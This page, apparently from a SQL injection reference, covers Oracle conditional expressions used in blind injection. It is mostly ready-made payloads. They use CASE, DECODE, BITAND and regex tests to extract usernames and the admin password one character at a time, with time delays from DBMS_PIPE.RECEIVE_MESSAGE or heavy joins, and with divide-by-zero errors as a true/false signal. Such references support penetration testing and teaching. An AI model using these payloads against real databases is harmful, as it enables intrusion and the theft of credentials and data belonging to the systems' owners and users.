---
title: Conditional Statements
description: Using Oracle conditional expressions for SQL injection attacks
category: Injection Techniques
order: 10
tags: ["conditional", "boolean", "case", "decode"]
lastUpdated: 2026-10-08
---

Conditional statements are fundamental for extracting information from Oracle databases, especially in blind SQL injection scenarios. Oracle provides several methods for implementing conditional logic, which can be leveraged to infer data even when direct output is not available.

## Basic Conditional Operators

Oracle supports standard conditional operators and expressions:

| Expression         | Description                                     | Example                                                           |
| ------------------ | ----------------------------------------------- | ----------------------------------------------------------------- |
| `CASE`             | Evaluates conditions and returns values         | `CASE WHEN condition THEN result1 ELSE result2 END`               |
| `DECODE`           | Compares expressions and returns matching value | `DECODE(expression, search1, result1, search2, result2, default)` |
| `IF-THEN-ELSE`     | PL/SQL only; not available inside a query       | `IF condition THEN action1; ELSE action2; END IF;`                |
| `AND`, `OR`, `NOT` | Logical operators                               | `condition1 AND condition2`                                       |

## Boolean-Based Injection

Boolean-based injection uses true/false conditions to extract information character by character:

```sql
-- Basic boolean condition
' OR 1=1--

-- More specific condition
' OR (SELECT COUNT(*) FROM users)>0--

-- Testing if admin user exists
' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--
```

## CASE Expressions

The CASE statement provides powerful conditional logic:

```sql
-- Simple CASE expression
' OR (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END)=1--

-- Character-by-character extraction
' OR (CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN 1 ELSE 0 END)=1--

-- Numeric comparison
' OR (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM users WHERE rownum=1)=97 THEN 1 ELSE 0 END)=1--
```

## DECODE Function

DECODE is Oracle's proprietary conditional function:

```sql
-- Simple DECODE usage
' OR DECODE((SELECT COUNT(*) FROM users),0,0,1)=1--

-- Character testing with DECODE
' OR DECODE(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1),'a',1,0)=1--

-- Multiple condition checking
' OR DECODE(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1),'a',1,'b',1,'c',1,0)=1--
```

## Combining with Time Delays

An `AND` payload only runs when the original condition is true: Oracle skips the rest of an `AND` once the first part is false. The examples inject after a valid value (`admin'`); with no known value, use an `OR` form instead.

Conditional expressions become particularly useful when combined with time delays in blind scenarios:

```sql
-- Time delay triggered on condition
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--

-- Extract data with time-based feedback
admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
```

## SQL Injection Examples

### Boolean Blind Extraction

Testing one bit per request needs 7 requests per character instead of up to 95. Oracle has no `&` operator; use `BITAND()`:

```sql
' OR BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)),1)=1--
' OR BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)),2)=2--
' OR BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)),4)=4--
```

### Time-Based Blind Extraction

```sql
-- Using DBMS_PIPE.RECEIVE_MESSAGE
admin' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--

-- Without delay functions: a heavy query that only runs when the condition is true
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b) ELSE 0 END)>=0--
```

`DBMS_LOCK.SLEEP` cannot be used here: it is a procedure, and procedures cannot be called from a query. See [Timing](/oracle/timing) for the available delay methods and their privileges.

### Testing Ranges

```sql
-- Testing a range of values at once (lowercase letter?)
' OR (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) BETWEEN 97 AND 122) THEN 1 ELSE 0 END)=1--
```

## Advanced Techniques

### Using Regular Expressions

Oracle's regular expression support can be combined with conditionals:

```sql
-- Using REGEXP_LIKE
' OR (CASE WHEN REGEXP_LIKE((SELECT username FROM users WHERE rownum=1),'^a') THEN 1 ELSE 0 END)=1--

-- Get pattern matches
' OR (CASE WHEN REGEXP_LIKE((SELECT username FROM users WHERE rownum=1),'^[a-d]') THEN 1 ELSE 0 END)=1--
```

### Using NVL and NULLIF

```sql
-- NVL for handling NULL values
' OR NVL((CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 END),0)=1--

-- NULLIF for comparison
' OR NULLIF((SELECT COUNT(*) FROM users),0) IS NOT NULL--
```

### Conditional Subqueries

```sql
-- Condition in subquery
' OR EXISTS(SELECT 1 FROM users WHERE ASCII(SUBSTR(username,1,1))=97)--

-- ALL and ANY operators
' OR 97 = ANY(SELECT ASCII(SUBSTR(username,1,1)) FROM users)--
```

## Multi-Condition Tests

```sql
-- Testing multiple conditions
' OR (CASE
    WHEN (SELECT COUNT(*) FROM users)>0 AND
         (SELECT COUNT(*) FROM user_tables)>10 AND
         (SELECT username FROM users WHERE rownum=1) LIKE 'a%'
    THEN 1 ELSE 0 END)=1--
```

## Errors as a Condition Signal

When true and false pages look the same but errors are visible, a division by zero in the false branch turns the condition into an error/no-error signal:

```sql
-- Raises ORA-01476 (divisor is equal to zero) when 'admin' does not exist
' OR (CASE WHEN (SELECT 1 FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='admin'))=1 THEN 1 ELSE 1/0 END)=1--
```
